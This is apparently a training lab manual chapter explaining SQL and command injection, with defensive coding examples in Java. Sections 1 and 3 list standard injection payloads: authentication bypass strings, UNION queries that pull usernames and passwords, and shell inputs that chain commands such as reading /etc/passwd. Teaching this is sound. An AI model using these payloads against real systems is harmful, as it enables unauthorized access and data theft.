# 💉 Lab Manual: Injection Attacks

### 0. Preface
In computer security, "injection" is a classic and dangerous attack technique. When an application concatenates user input into commands or queries without proper validation, attackers can make the system execute operations it shouldn't.

*   **Injection Attack**: Inserting malicious code into program input to alter program execution logic or obtain unauthorized data.
*   **Common Types**: SQL injection, command injection, LDAP injection, XPath injection, etc.

The goal of this chapter: **Understand the principles of injection attacks and master basic exploitation techniques.**

---

### 1. SQL Injection: The Database Backdoor

**Principle**:
When an application directly concatenates user input into SQL query statements without proper filtering or parameterized processing, attackers can construct special input to manipulate SQL statements, thereby bypassing authentication, stealing data, or damaging the database.

**Classic Scenario**:
```sql
-- Normal login query
SELECT * FROM users WHERE username='admin' AND password='secret'

-- Attacker input: admin' OR '1'='1
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password=''
-- Since '1'='1' is always true, the query returns all users!
```

**Attack Types**:
- **Authentication Bypass**: Using `' OR '1'='1` to bypass login
- **Union Query Injection**: Using `UNION SELECT` to get data from other tables
- **Blind Injection**: Inferring data through boolean conditions or time delays
- **Stacked Queries**: Using `;` to execute multiple SQL statements

**Fun Fact**:
SQL injection vulnerabilities were first publicly discussed in 1998 and remain a regular on the OWASP Top 10. Many large-scale data breaches were caused by SQL injection.

---

### 2. Command Injection: The System Key

**Principle**:
When an application passes user input directly to system command execution (like shell commands), attackers can inject additional commands through special characters to execute arbitrary operations on the server.

**Dangerous Scenario**:
```bash
# Application code (pseudocode)
system("ping -c 3 " + userInput)

# User input: 127.0.0.1; cat /etc/passwd
# Actually executes: ping -c 3 127.0.0.1; cat /etc/passwd
# Result: First executes ping, then displays the system password file!
```

**Command Separators**:
| Symbol | Function | Example |
|--------|----------|---------|
| `;` | Command separator | `cmd1; cmd2` |
| `\|` | Pipe | `cmd1 \| cmd2` |
| `&&` | Execute if previous succeeds | `cmd1 && cmd2` |
| `\|\|` | Execute if previous fails | `cmd1 \|\| cmd2` |
| `` `cmd` `` | Command substitution | `echo `whoami`` |
| `$(cmd)` | Command substitution | `echo $(whoami)` |

**Core Idea**:
You think the program is just pinging, but it might be "viewing" the server's secrets for you.

---

### 3. Common Injection Payloads

**SQL Injection - Authentication Bypass**:
```sql
' OR '1'='1
' OR '1'='1' --
admin' --
' OR 1=1 #
```

**SQL Injection - Union Query**:
```sql
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--
' UNION SELECT null,table_name FROM information_schema.tables--
```

**Command Injection**:
```bash
127.0.0.1; ls -la
127.0.0.1 | cat /etc/passwd
127.0.0.1 && whoami
`id`
$(cat /etc/passwd)
```

---

### 4. Dangers of Injection Attacks

**SQL Injection Consequences**:
- 🔓 **Authentication Bypass**: Login to any account without password
- 📊 **Data Leakage**: Access sensitive information in database (user data, credit card numbers, etc.)
- 🗑️ **Data Destruction**: Delete or modify database content
- 🔑 **Privilege Escalation**: Obtain administrator privileges
- 🚪 **Backdoor Implantation**: Create backdoor accounts in database

**Command Injection Consequences**:
- 💻 **Arbitrary Command Execution**: Execute any system command with web server privileges
- 📁 **File Read/Write**: Read sensitive configuration files, write WebShell
- 🔙 **Reverse Shell**: Obtain remote access to the server
- 🌐 **Internal Network Penetration**: Use the server as a pivot to attack internal network

---

### 5. Defense Measures Overview

**SQL Injection Defense**:

**1. Parameterized Queries (Preferred)**:
```java
// Wrong example
String sql = "SELECT * FROM users WHERE username='" + username + "'";

// Correct example - Using PreparedStatement
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username=?");
stmt.setString(1, username);
```

**2. Input Validation**:
```java
// Whitelist validation
if (!username.matches("^[a-zA-Z0-9_]+$")) {
    throw new IllegalArgumentException("Invalid username");
}
```

**3. Principle of Least Privilege**:
- Grant only necessary permissions to database accounts
- Use different database accounts for different functions

**Command Injection Defense**:

**1. Avoid Direct System Command Calls**:
```java
// Use language built-in library functions whenever possible
InetAddress.getByName(host).isReachable(5000);
```

**2. Input Validation and Escaping**:
```java
// Only allow valid IP address format
if (!host.matches("^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$")) {
    throw new IllegalArgumentException("Invalid IP address");
}
```

**3. Use Parameter Arrays Instead of String Concatenation**:
```java
// Use ProcessBuilder instead of Runtime.exec(String)
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "3", host);
```

---

### 6. Conclusion

The essence of injection attacks is "confusing the boundary between code and data" - when user input is executed as part of the code, security is broken.

Remember: **Never trust user input, always use parameterized/prepared statements to handle user data.**

Now, go try your skills in the lab. If you successfully bypassed login authentication or executed system commands, you've understood the essence of injection attacks. But more importantly, learn how to defend against these attacks.

---

**[Ready? Start Injecting]**
